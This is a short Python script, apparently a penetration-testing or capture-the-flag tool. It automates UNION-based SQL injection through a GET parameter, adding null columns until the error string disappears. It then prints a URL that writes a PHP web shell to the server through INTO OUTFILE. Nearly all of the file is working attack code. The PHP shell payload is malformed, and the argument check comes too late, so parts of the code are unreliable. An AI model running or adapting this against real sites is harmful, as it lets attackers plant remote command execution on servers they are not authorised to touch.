# Zebede3 2026
# GET request tests for UNION SQLi. 

import requests as req
import sys
from colorama import Fore, Style, init

init(autoreset=True)

host = sys.argv[1]
page_target = sys.argv[2]
uri_val = sys.argv[3]
failure_str = sys.argv[4]
outfile_loc = sys.argv[5]

if len(sys.argv) != 6:
    print("Usage: python union_col_finder.py <HOST> <LOGIN PAGE> <POST VARIABLE> <FAILURE STRING> <WRITE LOCATION>")
    sys.exit(0)

print(f"Finding column limit of UNION on {host}/{page_target} at value: {uri_val}")

c = 0
val = "null"
append_str = ", null"

while 1:
    c = c+1
    try:
        url = host + "/" + page_target + f"?{uri_val}=' UNION SELECT {val} -- //"
        print(f"URI #{c}: {url}")
        res = req.get(url=url)
        if failure_str in str(res.text):
            print(Fore.RED + f"    [-] Failure detected, continuing")
            val = val + append_str
            continue

        print(Fore.GREEN + Style.BRIGHT + f"[+] No failure detected. Stopped at count {c}")
        final_url = url.replace("null", "\"<?php system($_REQUEST(['cmd'])); ?>\"", count=1).replace("-- //", f"INTO OUTFILE \"{outfile_loc}/webshell.php\" -- //")
        print(Fore.GREEN + Style.BRIGHT + f"Final URL: {final_url}")
        break
        

    except Exception as e:
        print(f"Something went wrong: {e}")
        break
